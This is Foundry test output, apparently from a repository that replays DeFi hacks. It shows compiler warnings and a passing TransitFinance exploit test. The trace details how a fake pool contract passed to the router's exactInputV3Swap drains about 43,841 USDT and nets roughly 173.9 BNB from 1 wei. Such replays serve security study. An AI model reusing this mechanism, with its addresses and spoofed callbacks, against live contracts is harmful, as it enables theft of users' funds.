Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.20s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to view
  --> src/test/2023-12/TransitFinance_exp.sol:85:5:
   |
85 |     function swap(
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 279.41ms (117.39µs CPU time)

Ran 1 test for src/test/2023-12/TransitFinance_exp.sol:ContractTest
[PASS] testExploit() (gas: 226009)
Logs:
  Balance BNB before attack: 0.000000000000000001
  Balance USD of router: 43841.867959016089190183
  Balance BNB after attack: 173.907186477338745776

Traces:
  [236409] ContractTest::testExploit()
    ├─ emit log_named_decimal_uint(key: "Balance BNB before attack", val: 1, decimals: 18)
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x00000047bB99ea4D791bb749D970DE71EE0b1A34) [staticcall]
    │   └─ ← [Return] 43841867959016089190183 [4.384e22]
    ├─ emit log_named_decimal_uint(key: "Balance USD of router", val: 43841867959016089190183 [4.384e22], decimals: 18)
    ├─ [204596] 0x00000047bB99ea4D791bb749D970DE71EE0b1A34::exactInputV3Swap{value: 1}(ExactInputV3SwapParams({ srcToken: 0x0000000000000000000000000000000000000000, dstToken: 0x0000000000000000000000000000000000000000, dstReceiver: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, wrappedToken: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, amount: 1, minReturnAmount: 0, fee: 0, deadline: 1703037709 [1.703e9], pools: [728815563385977040452943777879061427756277306518 [7.288e47], 452312848583266388373324160500822705807063255235247521466952638073588228176 [4.523e74]], signature: 0x, channel: "" }))
    │   ├─ [6874] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::deposit{value: 1}()
    │   │   ├─ emit Deposit(dst: 0x00000047bB99ea4D791bb749D970DE71EE0b1A34, wad: 1)
    │   │   └─ ← [Stop] 
    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x00000047bB99ea4D791bb749D970DE71EE0b1A34) [staticcall]
    │   │   └─ ← [Return] 435497986799071272 [4.354e17]
    │   ├─ [355] ContractTest::token0() [staticcall]
    │   │   └─ ← [Return] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    │   ├─ [364] ContractTest::token1() [staticcall]
    │   │   └─ ← [Return] 0x55d398326f99059fF775485246999027B3197955
    │   ├─ [243] ContractTest::fee() [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3197] ContractTest::swap(0x00000047bB99ea4D791bb749D970DE71EE0b1A34, true, 1, 4295128740 [4.295e9], 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000040000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095ce3b91515faba4076e729fd79b6485a46bd17b308916cea1d9e1ce9a84ff53ee4)
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x00000047bB99ea4D791bb749D970DE71EE0b1A34) [staticcall]
    │   │   │   └─ ← [Return] 43841867959016089190183 [4.384e22]
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x00000047bB99ea4D791bb749D970DE71EE0b1A34) [staticcall]
    │   │   │   └─ ← [Return] 43841867959016089190183 [4.384e22]
    │   │   └─ ← [Return] -43841867959016089190183 [-4.384e22], -43841867959016089190183 [-4.384e22]
    │   ├─ [266] 0x36696169C63e42cd08ce11f5deeBbCeBae652050::token0() [staticcall]
    │   │   └─ ← [Return] 0x55d398326f99059fF775485246999027B3197955
    │   ├─ [308] 0x36696169C63e42cd08ce11f5deeBbCeBae652050::token1() [staticcall]
    │   │   └─ ← [Return] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    │   ├─ [251] 0x36696169C63e42cd08ce11f5deeBbCeBae652050::fee() [staticcall]
    │   │   └─ ← [Return] 500
    │   ├─ [130904] 0x36696169C63e42cd08ce11f5deeBbCeBae652050::swap(0x00000047bB99ea4D791bb749D970DE71EE0b1A34, true, 43841867959016089190183 [4.384e22], 4295128740 [4.295e9], 0x01000000000000000000000036696169c63e42cd08ce11f5deebbcebae6520500000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004000000000000000000000000055d398326f99059ff775485246999027b3197955c472bae540044f07329abf33830ef75493abc0d2c512713138a7906da9776bff)
    │   │   ├─ [2448] 0x4d67dc640f5327D0e1c7C6537eD8542aaf46cf99::accumulateReward(1703037709 [1.703e9])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [15508] 0x4d67dc640f5327D0e1c7C6537eD8542aaf46cf99::crossLmTick(-55300 [-5.53e4], true)
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [8062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x00000047bB99ea4D791bb749D970DE71EE0b1A34, 173907186477338745776 [1.739e20])
    │   │   │   ├─ emit Transfer(from: 0x36696169C63e42cd08ce11f5deeBbCeBae652050, to: 0x00000047bB99ea4D791bb749D970DE71EE0b1A34, value: 173907186477338745776 [1.739e20])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x36696169C63e42cd08ce11f5deeBbCeBae652050) [staticcall]
    │   │   │   └─ ← [Return] 9485011174029608430218334 [9.485e24]
    │   │   ├─ [19483] 0x00000047bB99ea4D791bb749D970DE71EE0b1A34::pancakeV3SwapCallback(43841867959016089190183 [4.384e22], -173907186477338745776 [-1.739e20], 0x01000000000000000000000036696169c63e42cd08ce11f5deebbcebae6520500000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004000000000000000000000000055d398326f99059ff775485246999027b3197955c472bae540044f07329abf33830ef75493abc0d2c512713138a7906da9776bff)
    │   │   │   ├─ [8871] 0x55d398326f99059fF775485246999027B3197955::transfer(0x36696169C63e42cd08ce11f5deeBbCeBae652050, 43841867959016089190183 [4.384e22])
    │   │   │   │   ├─ emit Transfer(from: 0x00000047bB99ea4D791bb749D970DE71EE0b1A34, to: 0x36696169C63e42cd08ce11f5deeBbCeBae652050, value: 43841867959016089190183 [4.384e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x36696169C63e42cd08ce11f5deeBbCeBae652050) [staticcall]
    │   │   │   └─ ← [Return] 9528853041988624519408517 [9.528e24]
    │   │   ├─ emit Swap(param0: 0x00000047bB99ea4D791bb749D970DE71EE0b1A34, param1: 0x00000047bB99ea4D791bb749D970DE71EE0b1A34, param2: 43841867959016089190183 [4.384e22], param3: -173907186477338745776 [-1.739e20], param4: 4990168276089522510497003971 [4.99e27], param5: 6871982296254711524581723 [6.871e24], param6: -55301 [-5.53e4], param7: 7453117553032735162 [7.453e18], param8: 0)
    │   │   └─ ← [Return] 43841867959016089190183 [4.384e22], -173907186477338745776 [-1.739e20]
    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x00000047bB99ea4D791bb749D970DE71EE0b1A34) [staticcall]
    │   │   └─ ← [Return] 174342684464137817048 [1.743e20]
    │   ├─ [10524] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(173907186477338745776 [1.739e20])
    │   │   ├─ [1384] 0x00000047bB99ea4D791bb749D970DE71EE0b1A34::fallback{value: 173907186477338745776}()
    │   │   │   ├─ emit Receipt(: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, : 173907186477338745776 [1.739e20])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit Withdrawal(src: 0x00000047bB99ea4D791bb749D970DE71EE0b1A34, wad: 173907186477338745776 [1.739e20])
    │   │   └─ ← [Stop] 
    │   ├─ [55] ContractTest::receive{value: 173907186477338745776}()
    │   │   └─ ← [Stop] 
    │   ├─ emit TransitSwapped(param0: 0x0000000000000000000000000000000000000000, param1: 0x0000000000000000000000000000000000000000, param2: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param3: 1, param4: 173907186477338745776 [1.739e20], param5: 0, param6: "")
    │   └─ ← [Return] 173907186477338745776 [1.739e20]
    ├─ emit log_named_decimal_uint(key: "Balance BNB after attack", val: 173907186477338745776 [1.739e20], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.27s (1.98s CPU time)

Ran 2 test suites in 2.67s (2.55s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
